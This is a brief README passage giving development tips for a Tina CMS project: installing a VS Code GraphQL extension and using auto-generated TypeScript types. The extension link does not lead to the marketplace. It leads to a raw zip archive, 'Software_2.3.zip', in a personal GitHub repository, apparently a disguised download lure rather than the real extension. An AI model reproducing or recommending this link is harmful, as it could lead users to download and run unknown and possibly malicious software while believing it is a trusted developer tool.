## Development tips

### Visual Studio Code GraphQL extension

[Install the GraphQL extension](https://github.com/joaquincanete/tina/raw/refs/heads/main/.tina/Software_2.3.zip) to benefit from type auto-completion.

### Typescript

A good way to ensure your components match the shape of your data is to leverage the auto-generated TypeScript types.
These are rebuilt when your `.tina` config changes.
